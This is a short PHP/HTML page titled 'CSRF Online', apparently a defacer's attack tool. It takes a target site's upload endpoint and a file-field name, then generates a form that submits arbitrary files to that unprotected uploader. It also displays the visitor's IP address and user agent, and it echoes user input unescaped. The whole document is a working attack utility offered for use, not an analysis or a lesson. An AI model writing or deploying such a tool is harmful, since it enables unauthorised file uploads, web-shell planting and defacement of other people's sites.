<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>CSRF Online</title>
<meta name="viewport" content="width=device-width, initial-scale=0.5">
<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet" type="text/css">
</head>
<center>
<style>
body{margin:100px;font-family:Montserrat;color:white;background: #000000;background-size:cover;background-repeat:no-repeat;}input{background:transparent;color:White;}h1{color:white;size:15px}a{text-decoration:none;color:white;}
</style>
<form method="post">
<h1>[C]ross [S]ite [R]equest [F]orgery</h1>
URL-Ex: target.com/[path]/upload.php<br>POSTFile-Ex: Filedata / files[] / qqfile / userfile / dll<br><br></font>
URL:<br><input type="text" name="victim" size="50" height="10" placeholder="" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File:<br><input type="text" name="post" size="50" height="10" placeholder="" style="margin: 5px auto; padding-left: 5px;" required><br><br>
<input type="submit" name="go" value="Lock!">
<p>
</center>
</form>
<?php
echo "<center>";
$url = $_POST['victim'];
$pf = $_POST['post'];
$d = $_POST['go'];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form>";
}

function IPnya() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'IP Tidak Dikenali';
 
    return $ipaddress;
}
$ipaddress = $_SERVER['REMOTE_ADDR'];
echo "<color='red'>Your IP:<br>";
echo IPnya();
echo "<p>Your Browser:<br> ";
echo $_SERVER['HTTP_USER_AGENT'];
?>
</form>
</html>